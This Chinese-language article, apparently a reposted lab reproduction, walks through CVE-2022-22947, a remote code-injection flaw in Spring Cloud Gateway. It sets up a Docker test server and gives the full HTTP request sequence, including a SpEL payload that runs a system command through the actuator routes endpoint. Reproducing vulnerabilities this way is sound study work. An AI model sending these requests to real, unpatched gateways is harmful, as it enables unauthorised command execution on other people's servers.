> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kCbcKuPqy9Ar-arjMYgUmw)

  

        Spring Cloud Gateway 提供了一个库，用于在 Spring WebFlux 之上构建 API 网关。

        在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击。远程攻击者可以发出恶意制作的请求，允许在远程主机上进行任意远程执行。

参考：

*   https://tanzu.vmware.com/security/cve-2022-22947
    
*   https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/  
    

漏洞环境

  

执行以下命令启动使用 Spring Cloud Gateway 3.1.0 的服务器：

```
docker-compose up -d
```

服务器启动后，浏览`http://your-ip:8080`查看示例页面。

  

漏洞重现  

首先，发送以下请求以添加包含邪恶 SpEL 表达式的路由器：

```
`POST /actuator/gateway/routes/hacktest HTTP/1.1``Host: localhost:8080``Accept-Encoding: gzip, deflate``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36``Connection: close``Content-Type: application/json``Content-Length: 329``{` `"id": "hacktest",` `"filters": [{` `"name": "AddResponseHeader",` `"args": {` `"name": "Result",` `"value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"` `}` `}],` `"uri": "http://example.com"``}`
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1icHoQAVfQdSfOW6Yic4o4ialzVKP79O1ZMqZ1ic1Ffo4PZHic9icMyw6SSjI9Lvw1UfTerkItoIvCh2Fw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

其次，刷新网关路由器。SpEL 表达式将在此步骤中执行：  

```
`POST /actuator/gateway/refresh HTTP/1.1``Host: localhost:8080``Accept-Encoding: gzip, deflate``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36``Connection: close``Content-Type: application/x-www-form-urlencoded``Content-Length: 0`
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1icHoQAVfQdSfOW6Yic4o4ialnDYo12OxnWckJHql5PricGKRTdmLkMc4k19aASnpeJUZcZXfRaXXveQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

第三，发送以下请求以检索结果：

  

```
`GET /actuator/gateway/routes/hacktest HTTP/1.1``Host: localhost:8080``Accept-Encoding: gzip, deflate``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36``Connection: close``Content-Type: application/x-www-form-urlencoded``Content-Length: 0`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

最后，发送一个 DELETE 请求来删除我们的恶意路由器：

  

```
`DELETE /actuator/gateway/routes/hacktest HTTP/1.1``Host: localhost:8080``Accept-Encoding: gzip, deflate``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36``Connection: close`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)